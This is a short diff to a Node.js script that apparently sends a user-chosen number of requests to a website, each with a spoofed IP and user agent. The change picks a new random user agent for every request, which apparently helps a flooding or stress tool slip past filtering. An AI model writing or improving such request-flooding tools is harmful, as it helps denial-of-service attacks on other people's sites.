@@ -53,10 +53,10 @@ function sendRequests() {
             }
 
             const agents = data.split('\n').filter(agent => agent.trim() !== '');
-            const spoofedAgent = getRandomAgent(agents);
             rl.question('NoR: '.yellow, (noOfRequests) => {
               const requests = parseInt(noOfRequests);
               for (let i = 0; i < requests; i++) {
+                const spoofedAgent = getRandomAgent(agents);
                 makeRequest(website, spoofedIP, spoofedAgent, i);
               }
               rl.close();
@@ -72,10 +72,10 @@ function sendRequests() {
               }
 
               const agents = data.split('\n').filter(agent => agent.trim() !== '');
-              const spoofedAgent = getRandomAgent(agents);
               rl.question('NoR: '.yellow, (noOfRequests) => {
                 const requests = parseInt(noOfRequests);
                 for (let i = 0; i < requests; i++) {
+                  const spoofedAgent = getRandomAgent(agents);
                   makeRequest(website, spoofedIP, spoofedAgent, i);
                 }
                 rl.close();
